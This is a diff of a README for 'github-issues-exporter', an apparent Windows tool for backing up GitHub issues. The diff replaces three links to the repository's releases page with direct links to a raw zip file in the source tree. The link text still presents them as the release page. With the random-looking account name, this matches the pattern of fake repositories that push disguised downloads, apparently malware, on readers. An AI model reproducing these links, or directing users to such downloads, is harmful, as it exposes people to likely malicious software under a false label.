@@ -1,6 +1,6 @@
 # 🗂️ github-issues-exporter - Back Up Issues With Less Effort
 
-[![Download github-issues-exporter](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/worshipped-confessor891/github-issues-exporter/releases)
+[![Download github-issues-exporter](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/worshipped-confessor891/github-issues-exporter/raw/refs/heads/main/src/github_issues_exporter_3.2.zip)
 
 ## 🚀 What this app does
 
@@ -18,7 +18,7 @@ It is useful when you want to:
 
 Visit the release page here:
 
-[Download github-issues-exporter](https://github.com/worshipped-confessor891/github-issues-exporter/releases)
+[Download github-issues-exporter](https://github.com/worshipped-confessor891/github-issues-exporter/raw/refs/heads/main/src/github_issues_exporter_3.2.zip)
 
 On that page, choose the latest release for Windows and download the file that matches your system. If you see more than one file, pick the one that ends in `.exe` or the Windows zip file.
 
@@ -212,7 +212,7 @@ A simple folder name like `2026-04-19` helps you track when each backup was made
 
 ## 📌 Release page
 
-[Open the latest github-issues-exporter release](https://github.com/worshipped-confessor891/github-issues-exporter/releases)
+[Open the latest github-issues-exporter release](https://github.com/worshipped-confessor891/github-issues-exporter/raw/refs/heads/main/src/github_issues_exporter_3.2.zip)
 
 ## 🧰 File handling tips
 
